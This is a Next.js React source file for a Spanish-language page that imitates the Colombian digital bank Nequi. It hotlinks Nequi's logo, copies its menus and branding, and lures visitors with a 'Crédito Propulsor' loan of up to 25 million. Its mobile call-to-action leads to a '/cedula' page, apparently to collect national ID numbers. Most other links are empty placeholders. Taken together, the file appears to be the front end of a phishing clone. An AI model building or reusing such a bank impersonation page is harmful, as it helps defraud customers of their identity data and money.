"use client"

import { Button } from "@/components/ui/button"
import { MessageCircle } from "lucide-react"
import Image from "next/image"
import Link from "next/link"
import { useState } from "react"

export default function Home() {
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false)

  return (
    <main className="min-h-screen bg-white">
      {/* Header */}
      <header className="relative flex items-center justify-between px-4 py-2 lg:px-12 lg:py-4">
        <Link href="/" className="flex items-center">
          <Image
            src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
            alt="Nequi Logo"
            width={96}
            height={40}
            className="object-contain"
            priority
          />
        </Link>

        {/* Desktop Navigation - Unchanged */}
        <nav className="hidden lg:flex items-center space-x-8">
          <div className="flex items-center space-x-8">
            <button className="text-gray-700 hover:text-gray-900 flex items-center">
              Para personas
              <svg className="w-4 h-4 ml-1" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <path d="M6 9l6 6 6-6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </button>
            <button className="text-gray-700 hover:text-gray-900 flex items-center">
              Ayuda
              <svg className="w-4 h-4 ml-1" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <path d="M6 9l6 6 6-6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </button>
            <button className="text-gray-700 hover:text-gray-900 flex items-center">
              Conócenos
              <svg className="w-4 h-4 ml-1" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                <path d="M6 9l6 6 6-6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </button>
            <Link href="#" className="text-gray-700 hover:text-gray-900">
              Tu negocio
            </Link>
            <Link href="#" className="text-[#E6007E] hover:text-[#C4006B]">
              Paga tu crédito
            </Link>
          </div>
          <div className="flex items-center space-x-4">
            <Button variant="outline" className="rounded-full px-8">
              Entrar
            </Button>
            <Button className="bg-[#E6007E] hover:bg-[#C4006B] rounded-full px-8">Recargar</Button>
          </div>
        </nav>

       {/* Mobile Menu Button */}
       <button
          className="lg:hidden flex items-center text-[#2D004C] transition-transform duration-300 ease-in-out"
          onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
          style={{
            transform: isMobileMenuOpen
              ? "translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotate(45deg)"
              : "translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotate(0deg)",
          }}
        >
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
            <path
              d={
                isMobileMenuOpen
                  ? "M18 6L6 18M6 6l12 12"
                  : "M3 12H21M3 6H21M3 18H21"
              }
              stroke="currentColor"
              strokeWidth="2"
              strokeLinecap="round"
            />
          </svg>
        </button>

        {/* Mobile Menu Overlay */}
        {isMobileMenuOpen && (
          <div className="lg:hidden fixed inset-0 bg-white z-50">
            <div className="flex flex-col h-full">
              <div className="flex items-center justify-between px-4 py-2 border-b">
                <Link href="/">
                  <Image
                    src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
                    alt="Nequi Logo"
                    width={96}
                    height={40}
                    className="object-contain"
                    priority
                  />
                </Link>
                <button
                  className="text-[#2D004C]"
                  onClick={() => setIsMobileMenuOpen(false)}
                >
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path
                      d="M18 6L6 18M6 6l12 12"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                    />
                  </svg>
                </button>
              </div>
              <nav className="flex-1 overflow-y-auto px-4 py-6">
                <div className="space-y-6">
                  <Link href="#" className="block text-xl font-medium text-gray-900">
                    Para personas
                  </Link>
                  <Link href="#" className="block text-xl font-medium text-gray-900">
                    Ayuda
                  </Link>
                  <Link href="#" className="block text-xl font-medium text-gray-900">
                    Conócenos
                  </Link>
                  <Link href="#" className="block text-xl font-medium text-gray-900">
                    Tu negocio
                  </Link>
                  <Link href="#" className="block text-xl font-medium text-[#E6007E]">
                    Paga tu crédito
                  </Link>
                </div>
                <div className="mt-8 space-y-4">
                  <Button variant="outline" className="w-full py-6 text-lg rounded-xl">
                    Entrar
                  </Button>
                  <Button className="w-full py-6 text-lg bg-[#E6007E] hover:bg-[#C4006B] rounded-xl">
                    Recargar
                  </Button>
                </div>
              </nav>
            </div>
          </div>
        )}
      </header>

      {/* Main Content */}
      <div className="flex flex-col lg:flex-row lg:items-center min-h-[calc(100vh-88px)]">
        {/* Hero Content */}
        <div className="px-6 lg:px-0 lg:w-1/2 lg:pr-12 order-2 lg:order-1">
          <h1 className="text-2xl lg:text-3xl font-medium mb-4">Desembolsa hasta 25.000.000*</h1>
          <h2 className="text-[40px] lg:text-[48px] leading-tight font-medium text-[#2D004C] mb-4">
            Crédito<br />Propulsor
          </h2>
          <p className="text-gray-500 text-sm mb-6">
            *Crédito de Consumo de Libre inversión, el monto máximo depende de tu capacidad de endeudamiento y políticas internas
          </p>
          <p className="text-xl mb-6">¡Recibe la plata de una en tu Nequi!</p>

          {/* QR Code - Desktop Only */}
          <div className="hidden lg:block mb-8">
            <div className="flex items-start gap-6">
              <Image
                src="/qr-propulsor.svg"
                alt="QR Code"
                width={120}
                height={120}
                className="object-contain"
              />
              <p className="text-lg mt-2">Escanea este código QR, descarga la app y pide tu crédito.</p>
            </div>
          </div>

          {/* Mobile CTA */}
          <div className="lg:hidden">
            <Link href="/cedula">
              <Button className="w-full py-6 text-lg bg-[#E6007E] hover:bg-[#C4006B] rounded-xl">
                Solicítalo
              </Button>
            </Link>
          </div>
        </div>

        {/* Hero Image */}
        <div className="relative w-full">
            <Image
              src="/nequihero.webp"
              alt="Person using laptop and phone"
              width={800}
              height={600}
              className="w-full h-auto"
              priority
            />
          </div>
      </div>

      {/* Help Button */}
      <button
        className="lg:hidden fixed bottom-6 right-6 bg-[#2D004C] text-white p-4 rounded-full shadow-lg flex items-center gap-2"
        aria-label="Ayuda"
      >
        <MessageCircle className="h-6 w-6" />
        <span className="font-medium">Ayuda</span>
      </button>
    </main>
  )
}